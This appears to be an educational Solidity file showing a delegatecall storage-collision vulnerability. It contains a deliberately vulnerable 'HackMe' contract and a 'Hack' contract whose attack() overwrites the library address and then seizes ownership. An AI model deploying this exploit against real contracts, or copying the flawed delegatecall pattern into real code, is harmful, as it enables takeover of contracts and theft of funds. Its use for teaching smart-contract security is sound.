//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) public {
        lib = _lib;
        owner = msg.sender;
    }
    
    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
} 

contract Hack {
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;
    
    constructor(HackMe _hackMe) public {
        hackMe = HackMe(_hackMe);
    }

    function attack() external {
        hackMe.doSomething(uint256(uint160(address(this))));
        hackMe.doSomething(5);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
